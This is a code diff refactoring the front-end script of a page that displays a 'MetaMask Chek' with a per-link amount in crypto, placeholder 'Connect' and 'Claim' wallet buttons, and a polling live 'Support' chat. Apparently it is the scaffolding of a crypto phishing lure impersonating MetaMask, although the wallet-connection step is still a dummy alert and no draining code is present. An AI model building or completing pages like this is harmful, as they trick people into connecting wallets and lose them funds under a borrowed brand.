@@ -1,143 +1,136 @@
-const params = new URLSearchParams(window.location.search);
-const linkId = params.get("id");
+const params = new URLSearchParams(location.search);
+const idFromUrl = params.get("id");
 
-// Elements for dynamic check info
-const checkTitleEl = document.getElementById("checkTitle");
-const amountEl = document.getElementById("amount");
-const currencyEl = document.getElementById("currency");
+function money(amount){
+  const n = Number(amount);
+  if (Number.isFinite(n)) return "$" + n.toLocaleString("en-US");
+  return "$" + String(amount);
+}
 
-// Buttons
-const btnConnect = document.getElementById("btnConnect");
-const btnClaim = document.getElementById("btnClaim");
-
-// Mobile burger
-const burgerBtn = document.getElementById("burgerBtn");
-const mobileMenu = document.getElementById("mobileMenu");
-
-// Chat UI
-const chatFab = document.getElementById("chatFab");
-const chatPanel = document.getElementById("chatPanel");
-const chatClose = document.getElementById("chatClose");
-const chatMessages = document.getElementById("chatMessages");
-const chatMsg = document.getElementById("chatMsg");
-const chatSend = document.getElementById("chatSend");
-
-// Dummy actions
-btnConnect?.addEventListener("click", () => {
-  alert("Wallet connect modal later (dummy for now).");
-});
-btnClaim?.addEventListener("click", () => {
-  alert("Claim flow later (dummy for now).");
-});
-
-// Mobile dropdown menu toggle
-function setMenu(open) {
-  if (!mobileMenu || !burgerBtn) return;
-  if (open) {
-    mobileMenu.classList.add("open");
-    mobileMenu.setAttribute("aria-hidden", "false");
-    burgerBtn.setAttribute("aria-expanded", "true");
-  } else {
-    mobileMenu.classList.remove("open");
-    mobileMenu.setAttribute("aria-hidden", "true");
-    burgerBtn.setAttribute("aria-expanded", "false");
+// ----- support chat helpers -----
+function getThreadId(linkId){
+  let tid = localStorage.getItem("greenland_thread_" + linkId);
+  if(!tid){
+    tid = Math.random().toString(36).slice(2, 12);
+    localStorage.setItem("greenland_thread_" + linkId, tid);
   }
-}
-burgerBtn?.addEventListener("click", () => {
-  const isOpen = mobileMenu?.classList.contains("open");
-  setMenu(!isOpen);
-});
-document.addEventListener("click", (e) => {
-  if (!mobileMenu || !burgerBtn) return;
-  if (!mobileMenu.classList.contains("open")) return;
-  const target = e.target;
-  if (mobileMenu.contains(target) || burgerBtn.contains(target)) return;
-  setMenu(false);
-});
-
-// Load link data
-fetch(`/api/link?id=${encodeURIComponent(linkId || "")}`)
-  .then(r => r.json())
-  .then(data => {
-    if (!data.ok) {
-      document.body.innerHTML = "Link not found";
-      return;
-    }
-
-    // Title: MetaMask Chek #<id>
-    checkTitleEl.textContent = `MetaMask Chek #${data.id}`;
-
-    // Amount: $1,250
-    const num = Number(data.amount);
-    const formatted = Number.isFinite(num)
-      ? new Intl.NumberFormat("en-US").format(num)
-      : String(data.amount);
-
-    amountEl.textContent = `$${formatted}`;
-
-    // currency: USDT
-    currencyEl.textContent = `currency: ${String(data.currency).toUpperCase()}`;
-  })
-  .catch(() => {
-    document.body.innerHTML = "Link not found";
-  });
-
-/* ===== Support chat (same behavior as before) ===== */
-
-// Thread id per visitor per link
-let threadId = localStorage.getItem("greenland_thread_" + linkId);
-if (!threadId) {
-  threadId = Math.random().toString(36).slice(2, 10);
-  localStorage.setItem("greenland_thread_" + linkId, threadId);
+  return tid;
 }
 
-// Open/close support panel
-function openChat() {
-  chatPanel.classList.add("open");
-  chatPanel.setAttribute("aria-hidden", "false");
-  chatMsg?.focus();
-}
-function closeChat() {
-  chatPanel.classList.remove("open");
-  chatPanel.setAttribute("aria-hidden", "true");
-}
-chatFab?.addEventListener("click", openChat);
-chatClose?.addEventListener("click", closeChat);
-
-// Render messages
-function render(messages) {
-  const lines = (messages || []).map(m => {
-    const who = m.from === "visitor" ? "You" : "Support";
-    const time = new Date(m.ts).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
-    return `[${time}] ${who}: ${m.text}`;
-  });
-  chatMessages.textContent = lines.join("\n");
-  chatMessages.scrollTop = chatMessages.scrollHeight;
+function renderMsgs(list){
+  const box = document.getElementById("chatMessages");
+  box.innerHTML = "";
+  for(const m of (list || [])){
+    const row = document.createElement("div");
+    row.className = "msg " + (m.from === "visitor" ? "me" : "them");
+    row.textContent = m.text;
+    box.appendChild(row);
+  }
+  box.scrollTop = box.scrollHeight;
 }
 
-// Poll messages
-function poll() {
-  fetch(`/api/support/poll?linkId=${encodeURIComponent(linkId || "")}&threadId=${encodeURIComponent(threadId)}`)
+function poll(linkId, threadId){
+  fetch(`/api/support/poll?linkId=${encodeURIComponent(linkId)}&threadId=${encodeURIComponent(threadId)}`)
     .then(r => r.json())
-    .then(d => { if (d.ok) render(d.messages || []); })
-    .catch(() => {})
-    .finally(() => setTimeout(poll, 1500));
+    .then(d => { if (d?.ok) renderMsgs(d.messages || []); })
+    .catch(()=>{})
+    .finally(()=> setTimeout(()=>poll(linkId, threadId), 1500));
 }
-poll();
 
-// Send message
-function send() {
-  const text = chatMsg.value.trim();
-  if (!text) return;
-  chatMsg.value = "";
-
-  fetch("/api/support/send", {
-    method: "POST",
-    headers: { "content-type": "application/json" },
+function sendMsg(linkId, threadId, text){
+  return fetch("/api/support/send", {
+    method:"POST",
+    headers:{ "content-type":"application/json" },
     body: JSON.stringify({ linkId, threadId, text })
-  }).catch(() => {});
+  });
 }
-chatSend?.addEventListener("click", send);
-chatMsg?.addEventListener("keydown", (e) => {
-  if (e.key === "Enter") send();
-});
+
+// fill both frames if elements exist
+function setText(id, value){
+  const el = document.getElementById(id);
+  if (el) el.textContent = value;
+}
+
+function wireDummyButton(el){
+  if(!el) return;
+  el.addEventListener("click", ()=> alert("Later (dummy for now)."));
+  el.addEventListener("keydown", (e)=>{ if(e.key==="Enter") alert("Later (dummy for now)."); });
+}
+
+(async function main(){
+  if(!idFromUrl) return;
+
+  // Mobile burger dropdown
+  const burgerBtn = document.getElementById("burgerBtn");
+  const mobileMenu = document.getElementById("mobileMenu");
+  if (burgerBtn && mobileMenu){
+    burgerBtn.addEventListener("click", ()=>{
+      const open = mobileMenu.style.display !== "flex";
+      mobileMenu.style.display = open ? "flex" : "none";
+      burgerBtn.setAttribute("aria-expanded", open ? "true" : "false");
+    });
+    document.addEventListener("click", (e)=>{
+      if(mobileMenu.style.display !== "flex") return;
+      if(mobileMenu.contains(e.target) || burgerBtn.contains(e.target)) return;
+      mobileMenu.style.display = "none";
+      burgerBtn.setAttribute("aria-expanded", "false");
+    });
+  }
+
+  // Fetch link data
+  const r = await fetch(`/api/link?id=${encodeURIComponent(idFromUrl)}`);
+  const data = await r.json();
+  if(!data?.ok){
+    document.body.innerHTML = "Link not found";
+    return;
+  }
+
+  // Fill Desktop
+  setText("checkTitle", `MetaMask Chek #${data.id}`);
+  setText("amount", money(data.amount));
+  setText("currency", `currency: ${String(data.currency).toUpperCase()}`);
+
+  // Fill Mobile
+  setText("checkTitle_m", `MetaMask Chek #${data.id}`);
+  setText("amount_m", money(data.amount));
+  setText("currency_m", `currency: ${String(data.currency).toUpperCase()}`);
+
+  // Dummy buttons
+  wireDummyButton(document.getElementById("btnConnect"));
+  wireDummyButton(document.getElementById("btnClaim"));
+  wireDummyButton(document.getElementById("btnClaim_m"));
+
+  // Support chat open/close
+  const panel = document.getElementById("chatPanel");
+  const fab = document.getElementById("chatFab");
+  const close = document.getElementById("chatClose");
+  const input = document.getElementById("chatMsg");
+  const send = document.getElementById("chatSend");
+
+  const threadId = getThreadId(String(data.id));
+
+  function openChat(){
+    panel.classList.remove("hidden");
+    panel.setAttribute("aria-hidden", "false");
+    input?.focus();
+  }
+  function closeChat(){
+    panel.classList.add("hidden");
+    panel.setAttribute("aria-hidden", "true");
+  }
+
+  fab.addEventListener("click", openChat);
+  close.addEventListener("click", closeChat);
+
+  async function doSend(){
+    const text = input.value.trim();
+    if(!text) return;
+    input.value = "";
+    await sendMsg(String(data.id), threadId, text);
+  }
+
+  send.addEventListener("click", doSend);
+  input.addEventListener("keydown", (e)=>{ if(e.key==="Enter") doSend(); });
+
+  poll(String(data.id), threadId);
+})();
